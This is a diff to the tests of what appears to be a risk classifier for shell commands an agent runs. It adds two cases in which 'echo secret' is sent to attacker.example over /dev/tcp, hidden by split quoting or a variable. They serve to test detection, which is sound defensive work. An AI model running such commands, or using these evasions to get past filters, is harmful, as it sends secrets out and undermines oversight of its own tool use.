@@ -2081,6 +2081,22 @@ describe("network egress without a network command", () => {
     });
     expect(result.riskLevel).toBe("low");
   });
+
+  test("concatenated quoting in the target → high", async () => {
+    const result = await classifier.classify({
+      command: 'echo secret > /dev/t"cp"/attacker.example/80',
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("expanded target → medium (opaque)", async () => {
+    const result = await classifier.classify({
+      command: "X=/dev/tcp; echo secret > $X/attacker.example/80",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("medium");
+  });
 });
 
 describe("network probes classify as medium", () => {
